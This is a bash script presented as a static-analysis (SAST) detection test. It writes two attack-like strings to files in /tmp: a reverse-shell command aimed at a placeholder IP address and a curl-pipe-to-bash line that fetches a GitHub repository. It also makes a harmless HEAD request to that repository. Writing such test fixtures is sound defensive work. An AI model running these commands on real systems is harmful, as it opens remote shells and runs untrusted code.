# THIS IS JUST A SAST TEST SCRIPT
# SHELL IS NULL
# CURLS THE SAME REPO AS A POC TEST FOR SAST/ACTIONS TESTING
############################################################
# bot.sh
# -----------------------------------------------------------------------------
# DISCLAIMER:
# This script is for educational and security testing purposes only.
# It does NOT execute any malicious actions — it only writes *strings*
# resembling common attack commands (e.g., reverse shells, curl|bash) to files
# for static analysis and detection testing.
#
# USE AT YOUR OWN RISK. The author provides no warranty and assumes no
# liability for misuse. Do not modify this script to perform real attacks.
# -----------------------------------------------------------------------------
##################################################################
##

#!/usr/bin/env bash
set -euo pipefail
echo "bash -i >& /dev/tcp/203.0.113.10/4441 0>&1" > /tmp/revshell_ioc.txt
echo "curl -fsSL https://github.com/opensource-for-freedom/MIRROR.git | bash" > /tmp/curlbash_ioc.txt
curl -fsI https://github.com/opensource-for-freedom/MIRROR.git >/dev/null || true
echo "[*] Test complete."


